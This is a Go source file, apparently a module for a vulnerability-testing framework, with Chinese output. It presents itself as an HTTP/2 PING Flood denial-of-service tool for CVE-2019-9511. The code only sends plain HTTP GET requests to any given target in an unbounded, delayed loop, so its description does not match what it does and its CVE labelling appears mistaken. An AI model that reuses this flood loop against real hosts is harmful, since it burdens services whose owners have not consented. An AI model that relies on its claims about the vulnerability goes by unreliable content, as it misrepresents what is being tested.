package main

import (
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		showHelp()
		return
	}

	switch os.Args[1] {
	case "--info":
		showInfo()
	case "--execute":
		executeModule()
	default:
		showHelp()
	}
}

func showHelp() {
	fmt.Println("Usage:")
	fmt.Println("  simple_http_flood --info           显示模块信息")
	fmt.Println("  simple_http_flood --execute [args] 执行模块")
}

func showInfo() {
	fmt.Println("name: simple_http_flood")
	fmt.Println("description: HTTP/2 PING Flood 拒绝服务漏洞测试工具 (CVE-2019-9511, CNVD-2019-24774)")
	fmt.Println("cnvd: CNVD-2019-24774")
	fmt.Println("cve: CVE-2019-9511")
	fmt.Println("option: target:string:true:")
	fmt.Println("option: port:int:false:443")
	fmt.Println("option: delay:float:false:0.5")
	fmt.Println("option: count:int:false:-1")
	fmt.Println("option: verbose:bool:false:false")
	fmt.Println("option: protocol:string:false:https")
}

func executeModule() {
	parameters := make(map[string]string)
	for argumentIndex := 2; argumentIndex < len(os.Args); argumentIndex++ {
		argument := os.Args[argumentIndex]
		argumentParts := splitArgument(argument)
		if len(argumentParts) == 2 {
			parameters[argumentParts[0]] = argumentParts[1]
		}
	}

	targetAddress, targetAddressExists := parameters["target"]
	if !targetAddressExists {
		fmt.Println("error: target is required")
		return
	}

	portNumber := "443"
	if portValue, portExists := parameters["port"]; portExists {
		portNumber = portValue
	}

	delayInterval := 0.5
	if delayValue, delayExists := parameters["delay"]; delayExists {
		if delayValueFloat, parseError := strconv.ParseFloat(delayValue, 64); parseError == nil {
			delayInterval = delayValueFloat
		}
	}

	requestCount := -1
	if countValue, countExists := parameters["count"]; countExists {
		if countValueInt, parseError := strconv.Atoi(countValue); parseError == nil {
			requestCount = countValueInt
		}
	}

	verboseMode := false
	if verboseValue, verboseExists := parameters["verbose"]; verboseExists {
		if verboseValueBool, parseError := strconv.ParseBool(verboseValue); parseError == nil {
			verboseMode = verboseValueBool
		}
	}

	protocolScheme := "https"
	if protocolValue, protocolExists := parameters["protocol"]; protocolExists {
		protocolScheme = protocolValue
	}

	fullTargetURL := fmt.Sprintf("%s://%s:%s", protocolScheme, targetAddress, portNumber)

	fmt.Printf("目标: %s\n", fullTargetURL)
	fmt.Printf("间隔: %.1f秒\n", delayInterval)
	if requestCount > 0 {
		fmt.Printf("次数: %d\n", requestCount)
	}
	fmt.Println("------------------------")

	executeFloodAttack(fullTargetURL, delayInterval, requestCount, verboseMode)
}

func executeFloodAttack(targetURL string, delayInterval float64, maxRequestCount int, verboseMode bool) {
	currentRequestCount := 0
	httpClient := &http.Client{
		Timeout: 10 * time.Second,
	}

	for {
		if maxRequestCount > 0 && currentRequestCount >= maxRequestCount {
			fmt.Printf("完成 %d 次请求\n", maxRequestCount)
			break
		}

		currentRequestCount++
		timeStamp := time.Now().Format("2006-01-02 15:04:05")

		response, requestError := httpClient.Get(targetURL)
		var httpStatusCode string
		if requestError != nil {
			httpStatusCode = "000"
		} else {
			httpStatusCode = strconv.Itoa(response.StatusCode)
			response.Body.Close()
		}

		switch httpStatusCode {
		case "200":
			fmt.Printf("[%s] #%d ✓ 200\n", timeStamp, currentRequestCount)
		case "404":
			fmt.Printf("[%s] #%d ✗ 404\n", timeStamp, currentRequestCount)
		case "403":
			fmt.Printf("[%s] #%d ✗ 403\n", timeStamp, currentRequestCount)
		case "000":
			fmt.Printf("[%s] #%d ✗ 连接失败\n", timeStamp, currentRequestCount)
		default:
			fmt.Printf("[%s] #%d ? %s\n", timeStamp, currentRequestCount, httpStatusCode)
		}

		time.Sleep(time.Duration(delayInterval * float64(time.Second)))
	}
}

func splitArgument(argument string) []string {
	argumentParts := make([]string, 0, 2)
	for characterIndex, character := range argument {
		if character == '=' {
			argumentParts = append(argumentParts, argument[:characterIndex], argument[characterIndex+1:])
			break
		}
	}
	if len(argumentParts) == 0 {
		argumentParts = append(argumentParts, argument)
	}
	return argumentParts
}
